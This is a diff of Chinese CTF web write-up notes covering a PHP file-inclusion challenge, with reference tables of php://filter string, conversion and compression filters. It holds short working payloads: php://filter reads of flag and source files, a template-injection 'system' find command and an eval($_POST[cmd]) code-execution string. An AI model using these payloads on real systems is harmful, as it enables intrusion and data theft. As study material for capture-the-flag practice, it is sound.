@@ -1081,7 +1081,9 @@ Twig
     func=\system&p=p=find / -name flag*
 ```
 
-## [BSidesCF 2020]Had a bad day
+## [BSidesCF 2020]Had a bad day(文件包含,php伪协议读取文件)
+
+### 题目解法
 
 点击页面中的按钮，GET传参，可能存在注入点，测试后发现不是SQL注入，根据报错信息得出和文件读取有关。更换参数网页提示只支持两个函数，读取index.php源码,
 
@@ -1108,32 +1110,64 @@ strpos — 查找字符串首次出现的位置
 
 payload: `php://filter/convert.base64-encode/resource=index/../flag` 或 `php://filter/convert.base64-encode/index/resource=flag`
 
-`convert.base64-encode`的替换
+### php://filter/
+
+#### String Filter (字符串过滤器)
 
 ```php
-    convert.iconv.<input-encoding>.<output-encoding> 
-    or 
-    convert.iconv.<input-encoding>/<output-encoding>
+string.rot13/resource=flag.php
+# string.rot13对字符串执行 ROT13 转换，ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。
+string.toupper/resource=flag.php
+# string.toupper 将字符串转化为大写
+string.tolower/resource=flag.php
+# string.tolower 将字符串转化为小写
+string.strip_tags/resource=flag.php
+# string.strip_tags从字符串中去除 HTML 和 PHP 标记，尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果
+```
 
-    <input-encoding>和<output-encoding> 就是编码方式，有如下几种;
+#### Conversion Filter(转化过滤器)
 
-    UCS-4*
-    UCS-4BE
-    UCS-4LE*
-    UCS-2
-    UCS-2BE
-    UCS-2LE
-    UTF-32*
-    UTF-32BE*
-    UTF-32LE*
-    UTF-16*
-    UTF-16BE*
-    UTF-16LE*
-    UTF-7
-    UTF7-IMAP
-    UTF-8*
-    ASCII*
-    BASE64
+```php
+convert.base64-encode & convert.base64-decode
+
+convert.iconv.<input-encoding>.<output-encoding> 
+# or 
+convert.iconv.<input-encoding>/<output-encoding>
+
+convert.quoted-printable-encode & convert.quoted-printable-decode
+
+# <input-encoding>和<output-encoding> 就是编码方式，有如下几种;
+```
+
+```php
+UCS-4*
+UCS-4BE
+UCS-4LE*
+UCS-2
+UCS-2BE
+UCS-2LE
+UTF-32*
+UTF-32BE*
+UTF-32LE*
+UTF-16*
+UTF-16BE*
+UTF-16LE*
+UTF-7
+UTF7-IMAP
+UTF-8*
+ASCII*
+BASE64
+```
+
+#### Compression Filters(压缩过滤器)
+
+```php
+# zlib.deflate（压缩）和 zlib.inflate（解压）
+zlib.deflate/resource=flag.php
+zlib.deflate|zlib.inflate/resource=flag.php
+
+# bzip2.compress和 bzip2.decompress
+# 同上
 ```
 
 ## BJDCTF2020 ZJCTF，不过如此(文件包含 + RCE-远程代码执行)
@@ -1203,7 +1237,7 @@ payload: `php://filter/convert.base64-encode/resource=index/../flag` 或 `php://
 
  payload: `\S*=${eval($_POST[cmd])}`同时再POST一个`cmd=system("ls /");` 或者 `\S*=${getFlag()}&cmd=system('ls /');`
 
-## BUUCTF2018 Onlion Tool
+## BUUCTF2018 Onlion Tool(RCE)
 
 源码
 
